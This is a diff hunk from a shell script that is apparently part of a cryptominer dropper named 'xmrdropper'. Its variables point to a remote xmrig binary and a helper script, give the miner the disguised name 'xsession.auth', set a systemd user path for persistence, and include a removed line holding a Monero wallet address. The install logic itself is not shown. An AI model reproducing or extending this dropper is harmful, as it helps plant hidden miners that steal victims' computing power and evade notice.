@@ -3,10 +3,9 @@
 REPO_URL=https://github.com/freebyte/xmrdropper
 XMRIG_URL=$REPO_URL/raw/master/xmrig
 APP_URL=$REPO_URL/raw/master/Xsession.sh
-LOCAL_PATH=$HOME/.local
+LOCAL_PATH=$HOME/.local/bin
 APPNAME=Xsession.sh
 XMRIGNAME=xsession.auth
-WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
 SYSTEMD_PATH=$HOME/.config/systemd/user
 
 
